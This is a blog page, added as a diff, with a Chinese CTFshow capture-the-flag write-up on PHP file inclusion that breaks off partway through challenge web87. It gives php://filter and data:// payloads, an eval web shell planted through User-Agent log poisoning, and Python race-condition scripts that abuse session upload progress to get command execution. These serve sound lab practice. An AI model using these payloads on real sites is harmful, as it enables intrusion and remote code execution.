@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"lzer0kx.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="CTFshow很棒的一个联系ctf-web的靶场 文件包含篇">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFshow-web入门-文件包含">
+<meta property="og:url" content="http://lzer0kx.top/2022/10/14/CTFSHOW-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:site_name" content="Lzer0Kx的信安之路">
+<meta property="og:description" content="CTFshow很棒的一个联系ctf-web的靶场 文件包含篇">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/14/CTFSHOW-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20221216145637857.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/14/CTFSHOW-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20221216144458866.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/14/CTFSHOW-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20221216144532340.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/14/CTFSHOW-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20221216144559114.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/14/CTFSHOW-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20221216144613578.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/14/CTFSHOW-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20221216144700916.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/10/14/CTFSHOW-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20221216144649868.png">
+<meta property="article:published_time" content="2022-10-14T06:58:36.000Z">
+<meta property="article:modified_time" content="2022-12-16T07:00:08.055Z">
+<meta property="article:author" content="Lzer0Kx">
+<meta property="article:tag" content="CTF刷题笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://lzer0kx.top/2022/10/14/CTFSHOW-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20221216145637857.png">
+
+<link rel="canonical" href="http://lzer0kx.top/2022/10/14/CTFSHOW-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CTFshow-web入门-文件包含 | Lzer0Kx的信安之路</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Lzer0Kx的信安之路</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://lzer0kx.top/2022/10/14/CTFSHOW-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Lzer0Kx">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lzer0Kx的信安之路">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CTFshow-web入门-文件包含
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-10-14 14:58:36" itemprop="dateCreated datePublished" datetime="2022-10-14T14:58:36+08:00">2022-10-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-12-16 15:00:08" itemprop="dateModified" datetime="2022-12-16T15:00:08+08:00">2022-12-16</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>CTFshow很棒的一个联系ctf-web的靶场</p>
+<p>文件包含篇</p>
+<span id="more"></span>
+
+<p><img src="/2022/10/14/CTFSHOW-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20221216145637857.png" alt="image-20221216145637857"></p>
+<h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很常规的文件包含</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤掉了php   ???  $file 尝试使用data协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?=eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后post查结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system(&quot;tac flag.php&quot;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤掉了上一题的办法，尝试一下包含日志</p>
+<p><img src="/2022/10/14/CTFSHOW-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20221216144458866.png" alt="image-20221216144458866"></p>
+<p>一句话木马先写入UA头，然后包含日志文件，然后再去读取数据</p>
+<h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤掉了:，上一题的方法还是能用的</p>
+<p>UA一句话木马需要先处理一下，用短标签的方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system(&quot;tac fl0g.php&quot;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h3><p>题目很明确的说了 需要条件竞争</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在上一题的基础上过滤掉了 .  这样我们只能考虑无后缀的文件 考虑包含session文件 通过翻找大佬笔记 找到一种方法</p>
+<p>利用session.upload_progress来进行文件包含 利用的是php_session_upload_progress参数</p>
+<p>原理</p>
+<p>该功能在php5.4被添加 下面是php.ini以下的几个默认选项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress.enable = on</span><br><span class="line">session.upload_progress.cleanup = on</span><br><span class="line">session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br></pre></td></tr></table></figure>
+
+<p>逐一分析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enable = on</span><br></pre></td></tr></table></figure>
+
+<p>表示upload_progress功能开始 意味着当浏览器向服务器上传一个文件时，php会把此次文件上传的详细信息(包括上传时间，上传进度)存储在session当中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleanup = on</span><br></pre></td></tr></table></figure>
+
+<p>表示当文件上传结束后，php会立即清空对应session文件中的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name</span><br></pre></td></tr></table></figure>
+
+<p>当它出现在表单中 php将会报告上传进度 而且它的值可控</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.use_strict_mode=off</span><br></pre></td></tr></table></figure>
+
+<p>默认值为off 表示对cookie中sessionid可控</p>
+<p>分析一下过程</p>
+<p>如果 session.auto_start&#x3D;on，则php会在接收请求的时候会自动初始化session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID&#x3D;rikka，PHP将会在服务器上创建一个文件&#x2F;tmp&#x2F;sess_rikka。即使此时用户没有初始化session，PHP也会自动初始化session。 并产生一个键值，这个键值有<code>ini.get(“session.upload_progress.prefix”)</code>+由我们构造的<code>session.upload_progress.name</code>值组成，最后被写入sess_文件里</p>
+<p>简单来说 我们自定义phpsessid的值会变成文件名 就像上面例子中的 phpsessid:rikka</p>
+<p>文件名 &#x2F;tmp&#x2F;sess_rikka</p>
+<p>而php_session_upload_progress的值即为该文件内容</p>
+<p>利用</p>
+<p>session.upload.progress.clean &#x3D; on 默认配置开启时 上传到&#x2F;tmp目录下的临时文件会被删除的  如果想rce的话 可以进行一下条件竞争 在session文件清空之前就包含执行文件</p>
+<p>上传脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://9420f3ce-e56a-4d40-acb3-6d72fffacf4b.challenge.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传包 爆破</p>
+<p><img src="/2022/10/14/CTFSHOW-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20221216144532340.png" alt="image-20221216144532340"></p>
+<p>开始条件竞争</p>
+<p>但是不知道为什么 这种方法竟然失败了 最终也是没有读到flag</p>
+<p>法二</p>
+<p>在大佬关于session.upload.progress文件包含的文章下 也附带了利用脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import io</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">sessid = &#x27;TGAO&#x27;</span><br><span class="line">data = &#123;&quot;cmd&quot;:&quot;system(&#x27;whoami&#x27;);&quot;&#125;</span><br><span class="line">def write(session):</span><br><span class="line">    while True:</span><br><span class="line">        f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)</span><br><span class="line">        resp = session.post( &#x27;http://127.0.0.1:5555/test56.php&#x27;, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;&#125;, files=&#123;&#x27;file&#x27;: (&#x27;tgao.txt&#x27;,f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125; )</span><br><span class="line">def read(session):</span><br><span class="line">    while True:</span><br><span class="line">        resp = session.post(&#x27;http://127.0.0.1:5555/test56.php?file=session/sess_&#x27;+sessid,data=data)</span><br><span class="line">        if &#x27;tgao.txt&#x27; in resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;[+++++++++++++]retry&quot;)</span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    with requests.session() as session:</span><br><span class="line">        for i in xrange(1,30): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">​</span><br><span class="line">        for i in xrange(1,30):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.set()</span><br></pre></td></tr></table></figure>
+
+<p>直接魔改一下</p>
+<p>yu22x大佬的脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import sys</span><br><span class="line">session=requests.session()</span><br><span class="line">sess=&#x27;yu22x&#x27;</span><br><span class="line">url1=&quot;http://05b536c9-c839-4df4-80a9-ddbc1ddeb979.challenge.ctf.show:8080/&quot;</span><br><span class="line">url2=&#x27;http://05b536c9-c839-4df4-80a9-ddbc1ddeb979.challenge.ctf.show:8080?file=/tmp/sess_&#x27;+sess</span><br><span class="line">data1=&#123;</span><br><span class="line">  &#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span><br><span class="line">&#125;</span><br><span class="line">data2=&#123;</span><br><span class="line">  &#x27;1&#x27;:&#x27;system(&quot;cat f*&quot;);&#x27;</span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line">  &#x27;file&#x27;:&#x27;abc&#x27;</span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line">  &#x27;PHPSESSID&#x27;: sess</span><br><span class="line">&#125;</span><br><span class="line">def write():</span><br><span class="line">  while True:</span><br><span class="line">    r = session.post(url1,data=data1,files=file,cookies=cookies)</span><br><span class="line">def read():</span><br><span class="line">  while True:</span><br><span class="line">    r = session.post(url2,data=data2)</span><br><span class="line">    if &#x27;ctfshow&#123;&#x27; in r.text:</span><br><span class="line">      print(r.text)</span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">       threading.Thread(target=read)]</span><br><span class="line">for t in threads:</span><br><span class="line">  t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>最终拿到flag</p>
+<h3 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">session_unset();</span><br><span class="line">session_destroy();</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line"></span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>和上一关没啥区别，就是多了两个函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session_unset()</span><br><span class="line">释放当前在内存中已经创建的所有$_SESSION变量，但不删除session文件以及不释放对应的sessionid</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session_destroy()</span><br><span class="line">删除当前用户对应的session文件以及释放sessionid，内存中的$_SESSION变量内容依然保留</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>两个函数无关紧要 还是可以用上一关的方法解决</p>
+<p>yu师傅脚本太强啦</p>
+<h3 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    system(&quot;rm -rf /tmp/*&quot;);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行删除文件 &#x2F;tmp&#x2F;*才会包含文件 竞争难度上升 但是还是可以利用脚本跑出来</p>
+<h3 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if(file_exists($file))&#123;</span><br><span class="line">    $content = file_get_contents($file);</span><br><span class="line">    if(strpos($content, &quot;&lt;&quot;)&gt;0)&#123;</span><br><span class="line">        die(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    include($file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>主要是这里做了改动</p>
+<p>检查文件是否存在 存在将整个文件写入一个字符串 查找字符串首次出现的位置 是否存在 &lt;&amp;#x20;</p>
+<p>还是先竞争一下 脚本多跑几次就能出结果</p>
+<h3 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">define(&#x27;还要秀？&#x27;, dirname(__FILE__));</span><br><span class="line">set_include_path(还要秀？);</span><br></pre></td></tr></table></figure>
+
+<p>定义了include的根路径为dirname(__FILE__) 也就是&#x2F;var&#x2F;www&#x2F;html</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirname()返回路径中的目录部分 _FILE_：文件的完整路径和文件名</span><br></pre></td></tr></table></figure>
+
+<p>但是这个还不影响我们条件竞争 直接用&#x2F;tmp寻找根目录下的tmp文件夹 继续跑脚本</p>
+<h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $content = $_POST[&#x27;content&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    file_put_contents(urldecode($file), &quot;&lt;?php 